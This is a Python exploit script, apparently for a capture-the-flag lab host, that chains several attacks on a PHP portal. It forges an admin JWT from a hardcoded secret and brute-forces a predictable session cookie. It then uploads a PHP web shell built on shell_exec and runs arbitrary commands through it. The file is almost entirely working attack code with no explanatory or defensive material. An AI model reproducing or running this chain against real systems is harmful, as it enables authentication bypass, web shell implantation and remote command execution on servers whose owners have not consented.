import argparse
import string
import sys
import jwt
import requests as r
import random
import hashlib

parser = argparse.ArgumentParser()
url = 'http://10.10.10.228/portal'
admin_name = 'paul'
secret = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e'
payload = {"data": {"username": admin_name}}
encoded_jwt = jwt.encode(payload, secret, algorithm="HS256")
# decoded_jwt = jwt.decode(encoded_jwt, secret, algorithms=["HS256"])
rnd_word = ''.join(random.choices(string.ascii_letters + string.digits, k=8))


def makesession(username):
    maximum = len(username) - 1
    seed = random.randint(0, maximum)
    key = "s4lTy_stR1nG_" + username[seed] + "(!528./9890"
    session_cookie = username + hashlib.md5(key.encode()).hexdigest()
    return session_cookie


def admin(admin_session):
    cookies_dict = {"PHPSESSID": admin_session, "token": encoded_jwt}
    admin_rsnp = r.get(f'{url}/index.php', cookies=cookies_dict)
    return admin_rsnp.text


def upload_file():
    loop = True
    print("[+] brute forcing session ID")
    while loop:
        gen_session = makesession(admin_name)
        # print(gen_session)
        check_paul = admin(gen_session)
        if "<h3>Dashboard</h3>" in check_paul:
            cookies_dict = {"PHPSESSID": gen_session, "token": encoded_jwt}
            data = "-----------------------------21178199893857990766125057944\r\nContent-Disposition: form-data; " \
                   f"name=\"file\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php echo " \
                   f"shell_exec($_POST[\"cmd\"]);?>\r\n-----------------------------21178199893857990766125057944\r" \
                   f"\nContent-Disposition: form-data; " \
                   f"name=\"task\"\r\n\r\n{rnd_word}.php\r\n" \
                   f"-----------------------------21178199893857990766125057944--\r\n "
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
                       "Accept": "*/*",
                       "Accept-Language": "en-US,en;q=0.5",
                       "Accept-Encoding": "gzip, deflate",
                       "X-Requested-With": "XMLHttpRequest",
                       "Content-Type": "multipart/form-data; boundary=---------------------------21178199893857990766125057944",
                       "Content-Length": str(len(data)),
                       "Origin": "http://10.10.10.228",
                       "DNT": "1",
                       "Connection": "close",
                       "Referer": f"{url}/php/files.php"}

            upload_file = r.post(f'{url}/includes/fileController.php', headers=headers, data=data, cookies=cookies_dict,
                                 allow_redirects=True)
            print("[+] " + upload_file.text)
            print(f"Filenme: {rnd_word}")
            loop = False


def exec_file(file_name, cmd):
    post_cmd = {"cmd": cmd}
    execute = r.post(f'{url}/uploads/{file_name}.php', data=post_cmd)
    print(execute.text)


parser.add_argument('-u', action='store_true', help="upload file")
parser.add_argument('-e', action='store_true', help="execute uploaded file")
parser.add_argument("-f", help="uploaded file name without Extension")
parser.add_argument("-c", help="windows cmd Command")
args = parser.parse_args()

if  __name__ == "__main__":
    try:
        if args.u:
            upload_file()
        elif args.e:
            if args.f and args.c:
                exec_file(args.f, args.c)
            else:
                print("[-] Missing argument")
        else:
            print(f"[-] Try python {sys.argv[0]} -h")
    except KeyboardInterrupt:
        print('User has exited the program')